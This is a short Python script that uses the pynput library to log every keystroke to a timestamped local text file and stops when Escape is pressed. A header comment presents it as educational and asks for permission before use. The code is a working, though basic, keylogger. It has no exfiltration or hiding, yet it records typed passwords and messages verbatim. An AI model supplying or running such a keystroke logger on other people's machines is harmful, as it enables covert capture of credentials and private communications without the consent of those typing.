from pynput import keyboard
import datetime

# Ethical Considerations:
# ===========================
# This keylogger is intended for educational purposes only. 
# Always obtain explicit permission from the owner of the system 
# before monitoring or logging keystrokes. 
# Unauthorized use of keyloggers is illegal and unethical. 
# Use this code responsibly and in compliance with local laws and regulations.
#
# By running this code, you agree to use it for lawful and ethical purposes only.
# ===========================

# Create a unique log file name based on the current timestamp
log_file = f"keylog_{datetime.datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"

# Define the on_press function to log key presses
def on_press(key):
    try:
        # Write the character pressed to the file
        with open(log_file, "a") as file:
            file.write(f"{key.char}")
    except AttributeError:
        # Handle special keys (like space, enter, etc.)
        with open(log_file, "a") as file:
            file.write(f" [{key}] ")

# Define the on_release function to stop the logger and print confirmation
def on_release(key):
    # If escape is pressed, stop the logger
    if key == keyboard.Key.esc:
        # Print confirmation message
        print(f"The file is saved as {log_file}")
        return False

# Start the keylogger
with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
